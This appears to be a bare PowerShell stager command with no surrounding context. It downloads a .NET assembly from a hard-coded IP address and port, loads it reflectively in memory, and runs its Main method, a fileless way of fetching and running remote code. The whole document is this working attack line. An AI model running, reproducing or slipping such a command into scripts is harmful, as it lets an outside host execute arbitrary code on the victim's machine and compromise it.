$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://159.65.59.24:1335/download/csharp/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);Start-Sleep 5;